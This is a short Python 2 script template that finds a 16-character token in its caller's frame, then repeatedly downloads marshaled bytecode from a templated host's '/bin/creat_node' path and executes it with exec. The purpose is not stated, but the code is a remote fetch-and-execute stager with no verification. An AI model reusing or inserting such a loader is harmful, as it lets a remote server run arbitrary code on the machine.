# !/usr/bin/env python
import imp

if imp.get_magic() != '\x03\xf3\r\n':
    print "Please update to Python 2.7.11 (http://www.python.org/download/)"
    exit()

import urllib2, time, re, sys, marshal
global _S
global _B
global _U
global _C
for k in sys._getframe(1).f_code.co_consts:
    if not isinstance(k, basestring):
        continue
    m = re.search('[a-zA-Z0-9]{16}', k)
    if m:
        _S = "{{ scheme }}"
        _B = "{{ host }}"
        _U = m.group()
        _C = True
        count = 30
        while _C:
            if count <= 0:
                break
            try:
                exec marshal.loads(urllib2.urlopen('%s://%s/bin/creat_node' % (_S, _B)).read())
            except Exception, e:
                print e
                time.sleep(240)
            count = count - 1
        break
